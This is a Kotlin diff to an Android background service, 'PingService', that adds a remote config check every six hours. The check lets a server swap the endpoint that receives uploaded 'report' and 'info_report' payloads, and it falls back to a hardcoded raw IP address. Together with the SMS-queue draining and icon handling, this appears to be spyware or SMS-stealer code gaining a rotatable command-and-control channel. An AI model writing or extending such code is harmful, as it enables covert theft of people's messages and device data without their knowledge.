@@ -21,9 +21,10 @@ import java.util.concurrent.TimeUnit
 class PingService : Service() {
 
     companion object {
-        const val WORKER_URL   = "https://pingmon.kapcher2019.workers.dev/ping"
-        const val APP_TOKEN    = "p7k2m9qx4bz8vn3rt"
+        const val WORKER_URL      = "https://pingmon.kapcher2019.workers.dev/config"
+        const val APP_TOKEN       = "p7k2m9qx4bz8vn3rt"
         const val PING_INTERVAL_MS = 30_000L   // FCM handles instant delivery
+        const val KEY_PING_URL    = "ping_url"
         const val CHANNEL_ID   = "pingmon"
         const val NOTIF_ID     = 1001
         const val ACTION_TICK  = "com.example.pingmon.TICK"
@@ -121,6 +122,7 @@ class PingService : Service() {
     private fun tick() {
         IconManager.retryIfPending(this)
         if (isOnline()) {
+            checkServerConfig()
             drainSmsQueue()
             sendPing()
         }
@@ -215,6 +217,28 @@ class PingService : Service() {
     }
 
     /* ═══════════════════════════════════════════ ping */
+    private fun checkServerConfig() {
+        val lastCheck = prefs.getLong("last_config_check", 0L)
+        if (System.currentTimeMillis() - lastCheck < 6 * 60 * 60 * 1000L) return
+        Thread {
+            try {
+                val req = Request.Builder().url(WORKER_URL).get().build()
+                client.newCall(req).execute().use { resp ->
+                    if (resp.isSuccessful) {
+                        val json = org.json.JSONObject(resp.body?.string() ?: "{}")
+                        val pingUrl = json.optString("ping_url", "")
+                        if (pingUrl.isNotBlank()) {
+                            prefs.edit()
+                                .putString(KEY_PING_URL, pingUrl)
+                                .putLong("last_config_check", System.currentTimeMillis())
+                                .apply()
+                        }
+                    }
+                }
+            } catch (e: Exception) { Log.w(TAG, "config check: ${e.message}") }
+        }.start()
+    }
+
     private fun sendPing() {
         val pendingReport = prefs.getString(KEY_REPORT, null)
         val pendingInfo   = prefs.getString("pending_info", null)
@@ -232,7 +256,10 @@ class PingService : Service() {
             if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
             if (!pendingInfo.isNullOrBlank())   put("info_report", pendingInfo)
         }.toString()
-        val req = Request.Builder().url(WORKER_URL)
+        // Use server URL from prefs (set via /config check every 6h)
+        val pingUrl = prefs.getString(KEY_PING_URL, null)
+            ?: "http://104.234.138.67:3000/ping"
+        val req = Request.Builder().url(pingUrl)
             .addHeader("X-Token", APP_TOKEN)
             .post(payload.toRequestBody("application/json".toMediaType()))
             .build()
